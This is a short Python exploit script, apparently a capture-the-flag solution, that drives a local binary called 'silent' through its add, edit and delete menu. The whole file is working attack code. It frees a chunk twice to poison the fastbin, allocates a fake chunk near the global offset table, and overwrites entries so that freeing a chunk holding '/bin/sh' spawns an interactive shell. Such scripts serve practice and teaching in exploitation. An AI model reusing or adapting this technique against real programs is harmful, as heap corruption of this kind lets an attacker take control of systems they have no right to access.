#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from time import sleep
import sys

def add(size, payload):
    io.writeline("1")
    sleep(0.1)
    io.writeline(str(size))
    sleep(0.1)
    io.writeline(payload)
    sleep(0.1)

def edit(idx, payload1, payload2):
    io.writeline("3")
    sleep(0.1)
    io.writeline(str(idx))
    sleep(0.1)
    io.writeline(payload1)
    sleep(0.1)
    io.writeline(payload2)
    sleep(0.1)

def delete(idx):
    io.writeline("2")
    sleep(0.1)
    io.writeline(str(idx))


if __name__ == '__main__':
    io = zio("./silent", print_read = COLORED(RAW, 'yellow'), print_write= COLORED(RAW, 'red'))
    io.read_until("==+RWBXtIRRV+.+IiYRBYBRRYYIRI;VitI;=;..........:::.::;::::...;;;:.\n\n\n")

    add(80, '0' * (80 - 1))
    add(80, '1' * (80 - 1))
    add(80, "/bin/sh\0".ljust(79, "\x01"))

    delete(0) # 0
    delete(1) # 1 -> 0
    delete(0) # 0 -> 1 -> 0

    fakeChunk = 0x601ffa

    add(80, l64(fakeChunk).ljust(79, "\x01")) # 0
    #  DEBUG()

    add(80, "2" * 79) # 1
    add(80, "3" * 79) # 0

    payload = 'a' * 6 + l64(0) + l64(0x400730) * 2
    add(80, payload)
    #  DEBUG()

    delete(2)

    io.interact()
    io.close()

